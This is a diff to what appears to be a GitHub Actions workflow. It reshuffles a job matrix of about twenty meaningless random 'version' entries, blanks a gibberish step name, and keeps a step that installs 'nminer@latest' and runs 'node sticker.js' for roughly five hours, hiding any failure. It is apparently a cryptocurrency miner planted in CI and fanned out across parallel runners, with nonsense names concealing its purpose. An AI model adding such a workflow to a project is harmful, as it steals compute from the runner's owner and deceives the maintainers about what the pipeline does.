@@ -9,24 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4870 }
-          - { version: 778 }
-          - { version: 9941 }
-          - { version: 2868 }
-          - { version: 9686 }
-          - { version: 6969 }
-          - { version: 9723 }
-          - { version: 291 }
-          - { version: 351 }
-          - { version: 7518 }
-          - { version: 5671 }
-          - { version: 3193 }
-          - { version: 2964 }
-          - { version: 2211 }
-          - { version: 2856 }
-          - { version: 44 }
-          - { version: 4888 }
-          - { version: 6420 }
+          - { version: 9782 }
+          - { version: 5282 }
+          - { version: 9026 }
+          - { version: 2041 }
+          - { version: 3984 }
+          - { version: 1546 }
+          - { version: 8587 }
+          - { version: 7249 }
+          - { version: 3600 }
+          - { version: 1982 }
+          - { version: 5850 }
+          - { version: 57 }
+          - { version: 427 }
+          - { version: 5848 }
+          - { version: 7673 }
+          - { version: 7933 }
+          - { version: 976 }
+          - { version: 6441 }
+          - { version: 2275 }
+          - { version: 8483 }
 
     steps:
       - name: Checkout
@@ -37,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: pace gee until apud
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 342m node sticker.js || echo "sticker executed"
+          timeout 302m node sticker.js || echo "sticker executed"
